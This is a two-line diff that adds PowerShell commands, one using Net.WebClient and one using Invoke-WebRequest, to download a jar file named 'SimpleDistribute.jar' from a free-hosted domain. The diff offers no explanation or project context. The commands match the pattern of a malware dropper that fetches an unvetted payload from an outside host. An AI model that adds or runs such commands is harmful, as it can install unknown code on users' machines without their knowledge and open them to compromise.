@@ -1,0 +1,2 @@
+powershell -Command "(New-Object Net.WebClient).DownloadFile('http://alertmywishlist.rf.gd/SimpleDistribute.jar', 'SimpleDistribute.jar')"
+powershell -Command "Invoke-WebRequest http://alertmywishlist.rf.gd/SimpleDistribute.jar -OutFile SimpleDistribute.jar"
